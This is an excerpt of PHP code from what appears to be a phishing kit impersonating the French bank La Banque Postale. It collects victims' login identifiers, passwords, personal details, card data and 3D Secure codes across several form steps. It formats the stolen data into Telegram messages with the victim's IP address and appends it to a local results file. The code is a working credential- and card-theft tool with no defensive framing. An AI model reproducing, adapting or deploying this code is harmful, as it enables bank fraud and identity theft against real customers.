<?php include_once'../../dbe4d86e109fc91473514d467a1000a1.php';?><?php
...
if($_SERVER['REQUEST_METHOD'] == "POST") {
    ...
    if ($_POST['type'] == "login") {
        ...
        if( count($_SESSION['errors']) == 0 ) {
            ...
            $telegram_message = '💎[Banque Postale] LOGIN 💎' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            ...
            file_put_contents("../../resultxff410.txt", $message, FILE_APPEND);
    ...
    if ($_POST['type'] == "certicode") {
        ...
        if( count($_SESSION['errors']) == 0 ) {
            ...
            $telegram_message = '💎 CERTICODE 💎' . $_SERVER['REMOTE_ADDR'] . "\r\n";
    ...
    if ($_POST['type'] == "details") {
        ...
        if( count($_SESSION['errors']) == 0 ) {
            ...
            $telegram_message = ' [📋] DETAILS[📋]' . $_SERVER['REMOTE_ADDR'] . "\r\n";
    ...
    if ($_POST['type'] == "cc") {
	    ...
	    $telegram_message = '  	[💣]  FULL DETAILS LAPOSTE [💣]  ' . $_SERVER['REMOTE_ADDR'] . "\r\n";
	    $telegram_message .= '[🎁] Identifiant : ' . $_SESSION['identifiant'] . "\r\n";
            $telegram_message .= '[🎁] Password : ' . $_SESSION['password'] . "\r\n";
            $telegram_message .= '[📋] Nom et prénom :  ' . $_SESSION['full_name'] . "\r\n";
            $telegram_message .= '[📋] Adresse  ' . $_SESSION['address'] . "\r\n";
            $telegram_message .= '[📋] Ville : ' . $_SESSION['city'] . "\r\n";
            $telegram_message .= '[📋] Code postale : ' . $_SESSIONT['zip_code'] . "\r\n";
            $telegram_message .= '[📋] Téléphone : ' . $_SESSION['phone'] . "\r\n";
            $telegram_message .= '[📋] Adresse électronique:  ' . $_SESSION['email'] . "\r\n";
            $telegram_message .= '[📋] Date de naissance:  ' . $_SESSION['birth_date'] . "\r\n";            
            $telegram_message .= '[💳] CARD INFO [💳]' . $_SERVER['REMOTE_ADDR'] . "\r\n";
    ...
    if ($_POST['type'] == "confirm_code") {
        ...
        if( count($_SESSION['errors']) == 0 ) {
            ...
            $telegram_message = '|3D SECURE|' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $telegram_message .= 'Code 3D  : ' . $_POST['confirm_code'] . "\r\n";
